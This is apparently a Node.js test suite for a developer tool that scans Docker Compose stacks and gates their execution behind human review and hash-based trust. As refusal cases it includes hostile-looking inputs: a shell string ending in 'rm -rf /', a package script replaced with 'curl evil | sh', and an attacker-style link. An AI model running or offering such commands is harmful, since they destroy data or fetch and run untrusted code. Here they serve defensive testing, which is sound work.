// PF-0072: Analyze Project → Review and save → Trust → Start, with the owner's regressions:
//   R1 changed Compose files or scripts block execution
//   R2 Stop project never stops shared infrastructure automatically
//   R3 running services YallaFlow does not own are never terminated
//   R4 saving a plan grants no execution
//   R5 unresolved scan results are never presented as confirmed
//   R6 concurrent changes cannot bypass the configuration trust checks
// The whole file runs in a fake home folder with a fake `docker` and `ss` on PATH, so it never
// touches the developer's real containers or home.
import test, { after } from 'node:test';
import assert from 'node:assert/strict';
import { spawn, spawnSync } from 'node:child_process';
import { chmod, mkdir, mkdtemp, readFile, realpath, rm, stat, symlink, writeFile } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';
import vm from 'node:vm';
import { initWorkspace } from '../src/core/workspace.js';
import { startConsoleServer } from '../src/console/server.js';
import { readCompose, parseYamlSubset } from '../src/runtime/compose.js';
import { consoleSaveSync, consoleTrustSync } from '../test-support/runtime-trust.js';

const cli = fileURLToPath(new URL('../src/cli.js', import.meta.url));
const SUPPORTED = process.platform === 'linux' || process.platform === 'darwin';
const SECRET = 'sentinel-Value-9f8e7d';
const ENV_SECRET = 'never-read-env-4c3b2a';

// ---- an isolated home, fake tools ----
const saved = { HOME: process.env.HOME, PATH: process.env.PATH, XDG_CONFIG_HOME: process.env.XDG_CONFIG_HOME };
const HOME = await realpath(await mkdtemp(path.join(os.tmpdir(), 'yf-home-')));
const BIN = path.join(HOME, '.fakebin');
await mkdir(BIN);
const PS_FILE = path.join(HOME, '.fake-docker-ps');
const UP_PORT_FILE = path.join(HOME, '.fake-docker-up-port');
await writeFile(path.join(BIN, 'docker'), `#!${process.execPath}
const fs = require('fs');
const args = process.argv.slice(2);
if (args[0] === 'ps') { try { process.stdout.write(fs.readFileSync(${JSON.stringify(PS_FILE)}, 'utf8')); } catch {} process.exit(0); }
if (args.includes('up')) {
  let port = 0; try { port = Number(fs.readFileSync(${JSON.stringify(UP_PORT_FILE)}, 'utf8')); } catch {}
  if (port) require('http').createServer((q, r) => r.end('ok')).listen(port, '127.0.0.1');
  process.on('SIGINT', () => process.exit(0)); process.on('SIGTERM', () => process.exit(0));
  setInterval(() => {}, 1000);
} else process.exit(0);
`);
await writeFile(path.join(BIN, 'ss'), '#!/bin/sh\nexit 0\n');
await chmod(path.join(BIN, 'docker'), 0o755);
await chmod(path.join(BIN, 'ss'), 0o755);
process.env.HOME = HOME;
process.env.XDG_CONFIG_HOME = path.join(HOME, '.config');
process.env.PATH = `${BIN}${path.delimiter}${process.env.PATH}`;
after(async () => {
  for (const [key, value] of Object.entries(saved)) { if (value === undefined) delete process.env[key]; else process.env[key] = value; }
  await rm(HOME, { recursive: true, force: true });
});

function run(cwd, args, env = {}) {
  return spawnSync(process.execPath, [cli, ...args], { cwd, encoding: 'utf8', env: { ...process.env, ...env } });
}
const json = (result) => JSON.parse(result.stdout.trim().split('\n').at(-1));
const alive = (pid) => { try { process.kill(pid, 0); return true; } catch { return false; } };
function freePort() {
  return new Promise((resolve) => { const server = net.createServer(); server.listen(0, '127.0.0.1', () => { const { port } = server.address(); server.close(() => resolve(port)); }); });
}
const statusOf = (root, id) => json(run(root, ['runtime', 'status', '--json'])).services.find((entry) => entry.id === id);
function trust(root, id) {
  const review = json(run(root, ['runtime', 'review', id, '--json'])).review;
  assert.ok(review.definitionHash, `review of ${id} has no hash: ${JSON.stringify(review.blocking)}`);
  const result = consoleTrustSync(root, id, review.definitionHash);
  assert.equal(result.status, 0, result.stdout + result.stderr);
  return review;
}

let counter = 0;
// A YaSchools-like workspace: ~/Work-N/{docker-compose.yml, docker/, other/, portal/ (the project)}.
async function workspace({ compose = null, extra = async () => {} } = {}) {
  const ws = path.join(HOME, `Work${++counter}`);
  const root = path.join(ws, 'portal');
  await mkdir(path.join(root, 'web'), { recursive: true });
  await initWorkspace(root, 'Portal', 'brownfield', 'adaptive');
  await mkdir(path.join(ws, 'docker', 'vhosts'), { recursive: true });
  await mkdir(path.join(ws, 'docker', 'web'), { recursive: true });
  await mkdir(path.join(ws, 'docker', 'mysql'), { recursive: true });
  await mkdir(path.join(ws, 'other', 'web'), { recursive: true });
  await writeFile(path.join(ws, 'docker', 'web', 'Dockerfile'), 'FROM php:8-apache\n');
  await writeFile(path.join(ws, 'docker', 'mysql', 'Dockerfile'), 'FROM mysql:8\n');
  await writeFile(path.join(ws, 'docker', 'vhosts', 'portal.conf'), '<VirtualHost *:80>\n  ServerName portal.localhost\n  DocumentRoot /var/www/html/portal/web\n</VirtualHost>\n');
  await writeFile(path.join(ws, 'docker', 'vhosts', 'other.conf'), '<VirtualHost *:80>\n  ServerName other.localhost\n  DocumentRoot /var/www/html/other/web\n</VirtualHost>\n');
  await writeFile(path.join(ws, '.env'), `DB_PASSWORD=${ENV_SECRET}\n`);
  await writeFile(path.join(ws, 'docker-compose.yml'), compose ?? `services:
  webserver:
    build:
      context: ./docker/web
    container_name: 'ws${counter}-web'
    ports:
      - "8080:80"
    links:
      - mysql
    volumes:
      - \${DOCUMENT_ROOT-./}:/var/www/html
      - ./docker/vhosts:/etc/apache2/sites-enabled
  mysql:
    build: ./docker/mysql
    container_name: 'ws${counter}-mysql'
    ports:
      - "3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: ${SECRET}
      MYSQL_DATABASE: app
`);
  await extra(ws, root);
  await writeFile(PS_FILE, '');
  await writeFile(UP_PORT_FILE, '0');
  return { ws, root, project: `work${counter}` };
}
const analyze = (root) => { const result = run(root, ['runtime', 'analyze', '--json']); assert.equal(result.status, 0, result.stdout + result.stderr); return json(result).scan; };

// ---------------------------------------------------------------- AC-001 / AC-002 / R5
test('Analyze finds the parent Compose stack, its vhost domains and its shared scope; reads no .env and keeps no environment values', { skip: !SUPPORTED }, async () => {
  const { ws, root } = await workspace();
  const scan = analyze(root);
  assert.equal(scan.services.length, 1);
  const stack = scan.services[0];
  assert.equal(stack.kind, 'docker-compose');
  assert.equal(stack.cwd, ws, 'the stack runs from its own folder outside the repository');
  assert.deepEqual(stack.command, ['docker', 'compose', '-f', 'docker-compose.yml', 'up']);
  assert.deepEqual(stack.ports, [8080, 3306]);
  assert.deepEqual(stack.links.map((link) => link.url), ['http://portal.localhost:8080/'], 'only the project\'s own vhost, on its published port');
  await writeFile(path.join(ws, 'docker', 'vhosts', 'gone.conf'), '<VirtualHost *:80>\n  ServerName gone.localhost\n  DocumentRoot /var/www/html/portal/missing/web\n</VirtualHost>\n');
  const again = analyze(root);
  assert.ok(!again.services[0].links.some((link) => /gone/.test(link.url)), 'a vhost whose folder does not exist is not a link');
  assert.ok(again.unresolved.some((item) => item.item === 'gone.localhost' && /does not exist/.test(item.reason)));
  await rm(path.join(ws, 'docker', 'vhosts', 'gone.conf'));
  assert.equal(stack.confidence, 'inferred', 'the mount comes from a variable default an .env can change');
  assert.ok(stack.shared.reasons.some((reason) => /defined outside the project/.test(reason)));
  assert.ok(stack.shared.reasons.some((reason) => /mysql is a data or infrastructure service/.test(reason)));
  assert.ok(stack.shared.reasons.some((reason) => /also holds 2 other folder/.test(reason)));
  assert.ok(stack.shared.reasons.some((reason) => /also serves 1 site/.test(reason)));
  assert.ok(stack.shared.scope.includes('site other.localhost'));
  assert.deepEqual(stack.components.find((c) => c.id === 'mysql').envNames, ['MYSQL_ROOT_PASSWORD', 'MYSQL_DATABASE'], 'names only');
  assert.ok(scan.coverage.scanned.includes(`~/Work${counter}/portal`) && scan.coverage.scanned.includes(`~/Work${counter}`) && scan.coverage.scanned.includes('~'));
  assert.ok(scan.coverage.limits.some((limit) => /folders above ~/.test(limit.what)), 'what was not scanned is stated');
  assert.equal(scan.observation.docker.available, true);
  const planFile = path.join(root, '.yallaflow', 'local', 'runtime-plan.json');
  const text = await readFile(planFile, 'utf8');
  assert.equal((await stat(planFile)).mode & 0o777, 0o600);
  for (const output of [text, JSON.stringify(scan)]) {
    assert.ok(!output.includes(SECRET), 'a Compose environment value is never kept');
    assert.ok(!output.includes(ENV_SECRET), '.env is never read');
  }
  assert.ok(!existsSync(path.join(root, '.yallaflow', 'runtime.yaml')), 'analysis saves nothing executable');
});

test('R5: what cannot be inspected is unresolved, never confirmed; an empty scan says where it looked', { skip: !SUPPORTED }, async () => {
  // A vhost folder outside the Compose folder, an unset build variable, and an anchor.
  const { root } = await workspace({
    compose: `services:
  webserver:
    build:
      context: \${WEB_BUILD}
    ports:
      - "8081:80"
    volumes:
      - ./:/var/www/html
      - ../elsewhere/vhosts:/etc/nginx/conf.d
  cache: &defaults
    image: redis:7
`
  });
  const scan = analyze(root);
  const stack = scan.services[0];
  assert.equal(stack.confidence, 'unresolved', 'blocking problems make the service unresolved');
  assert.ok(stack.blocking.some((reason) => /unset variable\(s\) WEB_BUILD/.test(reason)));
  assert.ok(stack.blocking.some((reason) => /anchor/i.test(reason)));
  assert.ok(scan.unresolved.some((item) => /outside the scanned scope/.test(item.reason)), 'a vhost folder outside the scope is unresolved, not absent');
  assert.ok(scan.unresolved.every((item) => typeof item.reason === 'string' && item.reason.length));
  // A project with nothing around it: the result names where it looked.
  const lonely = await mkdtemp(path.join(os.tmpdir(), 'yf-lonely-'));
  await initWorkspace(lonely, 'Lonely', 'greenfield', 'adaptive');
  const empty = analyze(lonely);
  assert.equal(empty.services.length, 0);
  assert.match(empty.nothingFound, /^Nothing found within: /);
  assert.ok(empty.coverage.limits.some((limit) => /outside your home folder/.test(limit.why)));
  // An agent cannot call something confirmed without evidence.
  const file = path.join(HOME, 'no-evidence.json');
  await writeFile(file, JSON.stringify({ services: [{ id: 'web', name: 'Web', kind: 'process', command: ['node', 'x.js'], cwd: '.', confidence: 'confirmed' }] }));
  const refused = run(root, ['runtime', 'plan', 'propose', '--file', file, '--json']);
  assert.equal(json(refused).error.code, 'RUNTIME_PLAN_INVALID');
  assert.match(json(refused).error.message, /a confirmed service needs evidence/);
});

test('the Compose reader fails closed on what it cannot read with certainty', () => {
  for (const [text, reason] of [['a: &x 1\nb: *x\n', /anchor|alias/i], ['x:\n  <<: *base\n', /merge|alias/i], ['services: {web: {image: x}}\n', /flow mapping/], ['a: 1\n---\nb: 2\n', /more than one YAML document/], ['a: !!binary x\n', /tag/i]]) {
    assert.ok(parseYamlSubset(text).problems.some((p) => reason.test(p.reason)), text);
  }
  const compose = readCompose('include:\n  - other.yml\nservices:\n  web:\n    extends:\n      service: base\n    build: https://example.com/repo.git\n');
  assert.ok(compose.problems.filter((p) => p.blocking).length >= 3);
  const clean = readCompose('services:\n  web:\n    image: nginx:1\n    ports:\n      - "8000:80"\n      - target: 443\n        published: 8443\n    environment:\n      - API_KEY=abc\n      - NAME\n');
  assert.deepEqual(clean.problems, []);
  assert.deepEqual(clean.services.web.ports.map((p) => p.host), [8000, 8443]);
  assert.deepEqual(clean.services.web.envNames, ['API_KEY', 'NAME']);
});

// ---------------------------------------------------------------- AC-003 / AC-004
test('agent proposals are validated and stored beside the scan; they never touch the profile or trust', { skip: !SUPPORTED }, async () => {
  const { ws, root } = await workspace();
  const propose = async (plan) => { const file = path.join(HOME, `plan-${Math.random().toString(16).slice(2)}.json`); await writeFile(file, JSON.stringify(plan)); return run(root, ['runtime', 'plan', 'propose', '--file', file, '--json']); };
  const base = { id: 'stack', name: 'Stack', kind: 'docker-compose', command: ['docker', 'compose', 'up'], cwd: ws, confidence: 'inferred', evidence: ['~/Work/docker-compose.yml'], links: [{ label: 'portal', url: 'http://portal.localhost:8080/' }] };
  const outsideHome = await mkdtemp(path.join(os.tmpdir(), 'yf-outside-'));
  await symlink(outsideHome, path.join(HOME, `escape${counter}`));
  const refusals = [
    [{ ...base, env: { DB_PASSWORD: 'x' } }, /names only|named like a secret/],
    [{ ...base, env: ['DB_PASSWORD=hunter2'] }, /names only|secret value/],
    [{ ...base, notes: ['token ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'] }, /secret/],
    [{ ...base, command: ['sh -c "docker compose up && rm -rf /"'] }, /argv array, not a shell string/],
    [{ ...base, cwd: outsideHome }, /home folder|outside the repository|allowed only/],
    [{ ...base, cwd: path.join(HOME, `escape${counter}`) }, /outside your home folder/],
    [{ ...base, links: [{ label: 'x', url: 'http://evil.example.com/' }] }, /\*\.localhost/],
    [{ ...base, dependsOn: ['ghost'] }, /depends on ghost/]
  ];
  for (const [service, reason] of refusals) {
    const refused = await propose({ services: [service] });
    assert.equal(json(refused).error.code, 'RUNTIME_PLAN_INVALID', JSON.stringify(service));
    assert.match(json(refused).error.message, reason);
    assert.ok(!refused.stdout.includes('hunter2') && !refused.stdout.includes('ghp_ABC'), 'a refused secret is never echoed');
  }
  const cycle = await propose({ services: [{ ...base, id: 'a', dependsOn: ['b'] }, { ...base, id: 'b', dependsOn: ['a'] }] });
  assert.match(json(cycle).error.message, /cycle/);
  analyze(root);
  const stored = await propose({ summary: 'The YaSchools stack.', services: [base], unresolved: [{ item: 'mail', reason: 'no mail catcher found' }] });
  assert.equal(stored.status, 0, stored.stdout);
  const shown = json(run(root, ['runtime', 'plan', 'show', '--json']));
  assert.equal(shown.agent.services[0].id, 'stack');
  assert.ok(shown.scan.services.length, 'the scan is kept beside the proposal');
  assert.ok(!existsSync(path.join(root, '.yallaflow', 'runtime.yaml')) && !existsSync(path.join(root, '.yallaflow', 'local', 'runtime.yaml')), 'a proposal never writes a profile');
  assert.equal(json(run(root, ['runtime', 'status', '--json'])).services.length, 0);
});

test('the agent request is prepared in the chat, never sent', async () => {
  const app = await readFile(new URL('../resources/console/app.js', import.meta.url), 'utf8');
  const start = app.indexOf('  function agentPlanRequest(');
  const code = app.slice(start, app.indexOf('  function analyzeProject(', start));
  const calls = [];
  const context = vm.createContext({ agentDraft: '', A: (ar, en) => en, esc: (x) => x, toast: (x) => calls.push(['toast', x]), toggleChat: (x) => calls.push(['chat', x]), agentPost: () => calls.push(['post']) });
  vm.runInContext(`${code}\nthis.ask = askAgentForPlan; this.draft = () => agentDraft;`, context);
  context.ask();
  assert.match(context.draft(), /yallaflow runtime plan propose --file/);
  assert.match(context.draft(), /Never open \.env files or copy any secret value/);
  assert.match(context.draft(), /You can only propose/);
  assert.deepEqual(calls.map((c) => c[0]), ['chat', 'toast'], 'the chat opens with the draft; nothing is posted');
});

// ---------------------------------------------------------------- R4 / AC-005 / AC-006
test('R4: saving a plan grants no execution; only a person can save; outside folders go to the personal file only', { skip: !SUPPORTED }, async () => {
  const { root } = await workspace();
  const scan = analyze(root);
  const id = scan.services[0].id;
  const scripted = run(root, ['runtime', 'plan', 'save', id, '--json']);
  assert.equal(json(scripted).error.code, 'RUNTIME_HUMAN_ONLY', 'an agent (no terminal) cannot save');
  const flagged = run(root, ['runtime', 'plan', 'save', id, '--json'], { YALLAFLOW_RUNTIME_VIA: 'console' });
  assert.equal(json(flagged).error.code, 'RUNTIME_HUMAN_ONLY', 'review finding 2: an environment flag is not a person');
  const saved = consoleSaveSync(root, [id], { from: 'scan', sharedProfile: true });
  assert.equal(saved.status, 0, saved.stdout + saved.stderr);
  assert.deepEqual(json(saved).saved, [{ id, profile: '.yallaflow/local/runtime.yaml', trusted: false }], 'an outside folder is never written to the shared profile');
  assert.ok(!existsSync(path.join(root, '.yallaflow', 'runtime.yaml')));
  const trustFlagged = run(root, ['runtime', 'trust', id, '--expect', `sha256:${'0'.repeat(64)}`, '--json'], { YALLAFLOW_RUNTIME_VIA: 'console' });
  assert.equal(json(trustFlagged).error.code, 'RUNTIME_TRUST_INTERACTIVE');
  const status = statusOf(root, id);
  assert.equal(status.trust.trusted, false);
  assert.equal(status.trust.reason, 'never');
  assert.ok(status.sharedMarker, 'the shared marker travels with the definition');
  const start = run(root, ['runtime', 'start', id, '--json']);
  assert.equal(json(start).error.code, 'RUNTIME_UNTRUSTED');
  const all = json(run(root, ['runtime', 'start', '--all', '--json']));
  assert.deepEqual(all.started, []);
  assert.equal(all.skipped[0].id, id);
  assert.equal(statusOf(root, id).state, 'stopped');
  assert.equal(statusOf(root, id).startedAt, null, 'no run record');
  assert.ok(!existsSync(path.join(root, '.yallaflow', 'local', 'runtime', 'logs', `${id}.log`)), 'nothing was spawned');
  const again = consoleSaveSync(root, [id], { from: 'scan' });
  assert.equal(json(again).error.code, 'RUNTIME_PLAN_EXISTS', 'an existing id changes only after confirmation');
});

test('AC-006: an outside folder is allowed only in the personal file and only inside home', { skip: !SUPPORTED }, async () => {
  const { ws, root } = await workspace();
  const shared = path.join(root, '.yallaflow', 'runtime.yaml');
  await writeFile(shared, JSON.stringify({ schemaVersion: 1, services: [{ id: 'x', name: 'X', kind: 'process', command: ['node', '-e', '1'], cwd: ws }] }));
  assert.match(json(run(root, ['runtime', 'status', '--json'])).profile.error, /allowed only in your personal/);
  await rm(shared);
  const outsideHome = await mkdtemp(path.join(os.tmpdir(), 'yf-outside-'));
  const local = path.join(root, '.yallaflow', 'local', 'runtime.yaml');
  await mkdir(path.dirname(local), { recursive: true });
  await writeFile(local, JSON.stringify({ schemaVersion: 1, services: [{ id: 'far', name: 'Far', kind: 'process', command: [process.execPath, '-e', 'setInterval(()=>{},1000)'], cwd: outsideHome }] }));
  const review = json(run(root, ['runtime', 'review', 'far', '--json'])).review;
  assert.ok(review.blocking.some((entry) => /outside your home folder/.test(entry.reason)), JSON.stringify(review.blocking));
  assert.equal(review.definitionHash, null);
  await writeFile(local, JSON.stringify({ schemaVersion: 1, services: [{ id: 'near', name: 'Near', kind: 'process', command: [process.execPath, '-e', 'setInterval(()=>{},1000)'], cwd: path.join(ws, 'other') }] }));
  trust(root, 'near');
  const started = json(run(root, ['runtime', 'start', 'near', '--json']));
  assert.equal(started.ok, true);
  try {
    assert.equal(statusOf(root, 'near').state, 'running');
  } finally {
    run(root, ['runtime', 'stop', 'near', '--json']);
  }
  assert.equal(alive(started.pid), false);
});

// ---------------------------------------------------------------- R1 / AC-011 / AC-009
test('R1: changing a trusted Compose file, override, Dockerfile, package script or shell script blocks execution', { skip: !SUPPORTED }, async () => {
  const { ws, root } = await workspace();
  const scan = analyze(root);
  const id = scan.services[0].id;
  consoleSaveSync(root, [id], { from: 'scan' });
  const review = trust(root, id);
  assert.ok(review.covered.includes('docker-compose.yml'));
  assert.ok(review.covered.includes(path.join('docker', 'web', 'Dockerfile')) && review.covered.includes(path.join('docker', 'mysql', 'Dockerfile')), 'the build Dockerfiles are covered');
  assert.ok(review.notCovered.some((entry) => entry.what === '.env' && /never read/.test(entry.why)), '.env is listed as not covered');
  assert.ok(review.shared.shared);
  const edits = [
    ['docker-compose.yml', (text) => text.replace('"8080:80"', '"8090:80"')],
    [path.join('docker', 'web', 'Dockerfile'), (text) => `${text}RUN echo changed\n`],
    ['docker-compose.override.yml', () => 'services:\n  webserver:\n    image: evil\n']
  ];
  for (const [file, edit] of edits) {
    const full = path.join(ws, file);
    const before = existsSync(full) ? await readFile(full, 'utf8') : null;
    await writeFile(full, edit(before ?? ''));
    const state = statusOf(root, id);
    assert.equal(state.trust.trusted, false, file);
    assert.equal(state.trust.reason, 'changed', file);
    assert.ok(state.trust.changed.inputs.includes(file), `${file} is named as what changed`);
    assert.equal(json(run(root, ['runtime', 'start', id, '--json'])).error.code, 'RUNTIME_UNTRUSTED', file);
    if (before === null) await rm(full); else await writeFile(full, before);
    assert.equal(statusOf(root, id).trust.trusted, true, `restoring ${file} restores the reviewed configuration`);
  }
  // Inside the repository: package scripts and a called shell script.
  const local = path.join(root, '.yallaflow', 'local', 'runtime.yaml');
  const doc = JSON.parse(await readFile(local, 'utf8'));
  doc.services.push({ id: 'npm-dev', name: 'Dev', kind: 'process', command: ['npm', 'run', 'dev'], cwd: 'web' }, { id: 'script', name: 'Script', kind: 'process', command: ['sh', 'run.sh'], cwd: 'web' });
  await writeFile(local, JSON.stringify(doc));
  await writeFile(path.join(root, 'web', 'package.json'), '{"scripts":{"dev":"node server.js"}}');
  await writeFile(path.join(root, 'web', 'run.sh'), 'echo one\n');
  trust(root, 'npm-dev');
  trust(root, 'script');
  await writeFile(path.join(root, 'web', 'package.json'), '{"scripts":{"dev":"curl evil | sh"}}');
  await writeFile(path.join(root, 'web', 'run.sh'), 'echo two\n');
  for (const name of ['npm-dev', 'script']) {
    assert.equal(statusOf(root, name).trust.reason, 'changed', name);
    assert.equal(json(run(root, ['runtime', 'start', name, '--json'])).error.code, 'RUNTIME_UNTRUSTED', name);
  }
  // Fail closed: an unreadable construct blocks trust (S1), the same command name or not.
  await writeFile(path.join(ws, 'docker-compose.yml'), 'services: {webserver: {image: x}}\n');
  const blocked = json(run(root, ['runtime', 'review', id, '--json'])).review;
  assert.ok(blocked.blocking.some((entry) => /flow mapping/.test(entry.reason)));
  assert.equal(blocked.definitionHash, null);
  const refused = consoleTrustSync(root, id, review.definitionHash);
  assert.equal(json(refused).error.code, 'RUNTIME_TRUST_BLOCKED');
});

// ---------------------------------------------------------------- R6
test('R6: a change between review and trust is refused; console runtime writes cannot interleave', { skip: !SUPPORTED }, async () => {
  const { ws, root } = await workspace();
  const scan = analyze(root);
  const id = scan.services[0].id;
  consoleSaveSync(root, [id], { from: 'scan' });
  const review = json(run(root, ['runtime', 'review', id, '--json'])).review;
  await writeFile(path.join(ws, 'docker', 'mysql', 'Dockerfile'), 'FROM mysql:9\n');
  const stale = consoleTrustSync(root, id, review.definitionHash);
  assert.equal(json(stale).error.code, 'RUNTIME_TRUST_STALE', 'the configuration changed after it was reviewed');
  assert.equal(statusOf(root, id).trust.trusted, false);
  // A slow Start project holds the project; a trust from the console meanwhile gets 409.
  const local = path.join(root, '.yallaflow', 'local', 'runtime.yaml');
  const port = await freePort();
  await writeFile(local, JSON.stringify({ schemaVersion: 1, services: [{ id: 'slow', name: 'Slow', kind: 'process', command: [process.execPath, '-e', 'setInterval(()=>{},1000)'], cwd: 'web', ports: [port], ready: { port }, readyTimeoutSeconds: 4 }] }));
  trust(root, 'slow');
  const server = await startConsoleServer({ roots: [root], port: 0 });
  const origin = server.url.replace(/\/$/, '');
  const headers = { Authorization: `Bearer ${server.token}`, Origin: origin, 'Content-Type': 'application/json' };
  try {
    const pid = (await (await fetch(`${server.url}api/projects`, { headers })).json()).projects[0].id;
    const startAll = fetch(`${server.url}api/p/${pid}/runtime/start-all`, { method: 'POST', headers, body: '{}' });
    await new Promise((resolve) => setTimeout(resolve, 400));
    const during = await fetch(`${server.url}api/p/${pid}/runtime/slow/trust`, { method: 'POST', headers, body: JSON.stringify({ confirm: 'slow', definitionHash: `sha256:${'0'.repeat(64)}` }) });
    assert.equal(during.status, 409);
    assert.equal((await during.json()).error.code, 'RUNTIME_BUSY');
    const save = await fetch(`${server.url}api/p/${pid}/runtime/plan/save`, { method: 'POST', headers, body: JSON.stringify({ ids: [id], replace: true }) });
    assert.equal(save.status, 409, 'saving cannot interleave either');
    await (await startAll).json();
  } finally {
    run(root, ['runtime', 'stop', '--all', '--json']);
    await server.close();
  }
});

// ---------------------------------------------------------------- R2 / AC-010
test('R2: Stop project never stops shared infrastructure; stopping it needs a typed confirmation (S3: evidence, not the marker)', { skip: !SUPPORTED }, async () => {
  const { root } = await workspace();
  const scan = analyze(root);
  const id = scan.services[0].id;
  consoleSaveSync(root, [id], { from: 'scan' });
  // S3: drop the stored marker. The evidence (outside Compose file, mysql, other sites) still decides.
  const local = path.join(root, '.yallaflow', 'local', 'runtime.yaml');
  const doc = JSON.parse(await readFile(local, 'utf8'));
  delete doc.services[0].shared;
  doc.services[0].ports = [];
  doc.services[0].ready = null;
  await writeFile(local, JSON.stringify(doc));
  trust(root, id);
  const started = json(run(root, ['runtime', 'start', id, '--json']));
  assert.equal(started.ok, true, JSON.stringify(started));
  const pid = started.pid;
  try {
    const stopAll = json(run(root, ['runtime', 'stop', '--all', '--json']));
    assert.equal(stopAll.results[0].left, 'shared');
    assert.equal(alive(pid), true, 'Stop project left the shared stack running');
    const single = json(run(root, ['runtime', 'stop', id, '--json']));
    assert.equal(single.error.code, 'RUNTIME_SHARED');
    assert.match(single.error.message, /mysql is a data or infrastructure service/);
    assert.equal(alive(pid), true);
    const restart = json(run(root, ['runtime', 'restart', id, '--json']));
    assert.equal(restart.error.code, 'RUNTIME_SHARED', 'restart is protected too');
    // The console needs the typed id.
    const server = await startConsoleServer({ roots: [root], port: 0 });
    const headers = { Authorization: `Bearer ${server.token}`, Origin: server.url.replace(/\/$/, ''), 'Content-Type': 'application/json' };
    try {
      const projectId = (await (await fetch(`${server.url}api/projects`, { headers })).json()).projects[0].id;
      const plain = await fetch(`${server.url}api/p/${projectId}/runtime/${id}/stop`, { method: 'POST', headers, body: '{}' });
      assert.equal(plain.status, 422);
      const body = await plain.json();
      assert.equal(body.error.code, 'RUNTIME_SHARED');
      assert.ok(body.shared.scope.includes('site other.localhost'), 'the console shows who else may be affected');
      const wrong = await fetch(`${server.url}api/p/${projectId}/runtime/${id}/stop`, { method: 'POST', headers, body: JSON.stringify({ confirmShared: 'yes' }) });
      assert.equal(wrong.status, 400);
      assert.equal(alive(pid), true);
      const confirmed = await fetch(`${server.url}api/p/${projectId}/runtime/${id}/stop`, { method: 'POST', headers, body: JSON.stringify({ confirmShared: id }) });
      assert.equal(confirmed.status, 200, await confirmed.clone().text());
    } finally { await server.close(); }
    assert.equal(alive(pid), false, 'stopped only after the confirmation, and only YallaFlow\'s own process');
  } finally { if (alive(pid)) process.kill(-pid, 'SIGKILL'); }
  // A marker alone also protects a plain process (it only adds protection).
  await writeFile(local, JSON.stringify({ schemaVersion: 1, services: [{ id: 'db', name: 'DB', kind: 'process', command: [process.execPath, '-e', 'setInterval(()=>{},1000)'], cwd: 'web', shared: { scope: ['other projects'] } }] }));
  trust(root, 'db');
  const db = json(run(root, ['runtime', 'start', 'db', '--json']));
  try {
    assert.equal(json(run(root, ['runtime', 'stop', '--all', '--json'])).results[0].left, 'shared');
    assert.equal(alive(db.pid), true);
    assert.equal(json(run(root, ['runtime', 'stop', 'db', '--confirm-shared', '--json'])).state, 'stopped');
  } finally { if (alive(db.pid)) process.kill(-db.pid, 'SIGKILL'); }
});

// ---------------------------------------------------------------- R3 / AC-007
test('R3: a stack already running outside YallaFlow is never started or stopped; a busy port is reported with its owner and nothing is killed', { skip: !SUPPORTED }, async () => {
  const { root, project } = await workspace();
  const scan = analyze(root);
  const id = scan.services[0].id;
  consoleSaveSync(root, [id], { from: 'scan' });
  trust(root, id);
  // The stack's containers already run (started by someone else).
  const outside = spawn(process.execPath, ['-e', 'setInterval(()=>{},1000)'], { stdio: 'ignore', detached: true });
  outside.unref();
  await writeFile(PS_FILE, `${JSON.stringify({ Names: `ws-outside`, Image: 'mysql:8', Ports: '0.0.0.0:3306->3306/tcp', Labels: `com.docker.compose.project=${project},com.docker.compose.service=mysql`, State: 'running' })}\n`);
  try {
    const single = json(run(root, ['runtime', 'start', id, '--json']));
    assert.equal(single.state, 'running-outside');
    assert.deepEqual(single.outside, ['ws-outside']);
    const all = json(run(root, ['runtime', 'start', '--all', '--json']));
    assert.equal(all.started[0].state, 'running-outside');
    assert.deepEqual(statusOf(root, id).runningOutside, ['ws-outside']);
    assert.equal(statusOf(root, id).state, 'stopped', 'not ours');
    json(run(root, ['runtime', 'stop', '--all', '--json']));
    assert.equal(alive(outside.pid), true, 'a service YallaFlow does not own is never terminated');
  } finally { process.kill(outside.pid, 'SIGKILL'); await writeFile(PS_FILE, ''); }
  // A foreign listener on a declared port: that service and its dependants are skipped.
  const port = await freePort();
  const holder = spawn(process.execPath, ['-e', `require('net').createServer().listen(${port}, '127.0.0.1')`], { stdio: 'ignore', detached: true });
  holder.unref();
  await new Promise((resolve) => setTimeout(resolve, 300));
  const local = path.join(root, '.yallaflow', 'local', 'runtime.yaml');
  await writeFile(local, JSON.stringify({ schemaVersion: 1, services: [
    { id: 'api', name: 'API', kind: 'process', command: [process.execPath, '-e', 'setInterval(()=>{},1000)'], cwd: 'web', ports: [port] },
    { id: 'ui', name: 'UI', kind: 'process', command: [process.execPath, '-e', 'setInterval(()=>{},1000)'], cwd: 'web', dependsOn: ['api'] }
  ] }));
  trust(root, 'api');
  trust(root, 'ui');
  try {
    const all = json(run(root, ['runtime', 'start', '--all', '--json']));
    assert.deepEqual(all.started, []);
    assert.equal(all.failed, null);
    assert.match(all.skipped.find((entry) => entry.id === 'api').reason, new RegExp(`Port ${port} on 127.0.0.1 is already in use by .*nothing was stopped`));
    assert.match(all.skipped.find((entry) => entry.id === 'ui').reason, /depends on api/);
    assert.equal(alive(holder.pid), true, 'the port holder is never killed');
  } finally { process.kill(holder.pid, 'SIGKILL'); }
});

// ---------------------------------------------------------------- AC-002 / AC-008
test('without Docker the analysis says so and continues; a read-only console views the plan but changes nothing', { skip: !SUPPORTED }, async () => {
  const { root } = await workspace();
  const noDocker = run(root, ['runtime', 'analyze', '--json'], { PATH: path.dirname(process.execPath) });
  const scan = json(noDocker).scan;
  assert.equal(scan.observation.docker.available, false);
  assert.match(scan.observation.docker.reason, /not installed/);
  assert.equal(scan.services.length, 1, 'the files are still read');
  const server = await startConsoleServer({ roots: [root], port: 0, readOnly: true });
  const headers = { Authorization: `Bearer ${server.token}`, Origin: server.url.replace(/\/$/, ''), 'Content-Type': 'application/json' };
  try {
    const projectId = (await (await fetch(`${server.url}api/projects`, { headers })).json()).projects[0].id;
    const plan = await fetch(`${server.url}api/p/${projectId}/runtime/plan`, { headers });
    assert.equal(plan.status, 200);
    assert.equal((await plan.json()).scan.services.length, 1);
    for (const route of ['runtime/analyze', 'runtime/plan/save']) {
      const refused = await fetch(`${server.url}api/p/${projectId}/${route}`, { method: 'POST', headers, body: JSON.stringify(route.endsWith('save') ? { ids: ['x'] } : {}) });
      assert.equal(refused.status, 405, route);
    }
  } finally { await server.close(); }
});

